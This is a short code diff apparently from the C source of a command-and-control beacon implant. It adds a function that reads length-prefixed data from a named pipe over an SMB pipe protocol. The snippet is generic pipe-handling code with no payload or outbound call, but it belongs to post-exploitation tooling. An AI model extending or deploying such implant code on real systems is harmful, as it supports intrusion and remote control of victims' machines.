@@ -5,6 +5,7 @@
 #include "beacon.h"
 #include "identity.h"
 #include "pipe.h"
+#include "protocol.h"
 #include "spawn.h"
 #include "utils.h"
 
@@ -170,6 +171,23 @@ int JobReadDataFromPipe(HANDLE hPipe, char* buffer, int size)
 	}
 
 	return totalRead;
+}
+
+int JobReadDataFromPipeWithHeader(HANDLE hPipe, char* buffer, int size)
+{
+	DWORD lpTotalBytesAvail;
+	DWORD headerSize = 0;
+
+	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL))
+		return -1;
+
+	if (!lpTotalBytesAvail)
+		return 0;
+
+	if (ProtocolSmbPipeRead(hPipe, (char*)&headerSize, sizeof(headerSize)) != sizeof(headerSize) || headerSize > size)
+		return -1;
+
+	return ProtocolSmbPipeRead(hPipe, buffer, headerSize);
 }
 
 JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, char* description, BOOL isMsgMode)
